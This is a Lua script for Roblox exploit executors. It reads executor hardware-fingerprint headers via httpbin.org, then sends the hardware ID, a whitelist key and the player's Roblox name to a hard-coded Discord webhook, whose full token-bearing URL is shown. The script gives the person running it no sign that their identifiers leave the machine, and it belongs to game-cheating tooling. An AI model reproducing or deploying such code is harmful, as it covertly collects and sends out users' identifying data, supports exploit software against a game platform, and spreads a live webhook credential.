local req = (syn and syn.request) or request or http_request
local body = req({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid",'shadow_hardware',"Flux-Fingerprint","Wrd-Fingerprint"};
local hwid3 = "";
for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid3 = decoded.headers[v];
        break
    end
end
local req = http_request or request or HttpPost or syn.request
 local function output(Text)
    local a,b  = pcall(function()
        local Full = Text
        local data = {
            ["content"] = Full
        }
        local Post = req({Url = "https://discordapp.com/api/webhooks/995320760048566343/bxLHZ8Vaef0u7pkzUsECyng5vAjgsLpb4ijd5XicOgfpNpRyxsxnk-rbfk6kF_M1zgoA", 
        Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, 
        Body = game:GetService('HttpService'):JSONEncode(data)})
    end)
    if b then
        print("Webhook Errored")
    end
end
output(hwid3.." "..tostring(_G.wl_key)..game.Players.LocalPlayer.Name)
repeat wait()
  until _G.wl_key ~= nil
output(hwid3.." "..tostring(_G.wl_key))
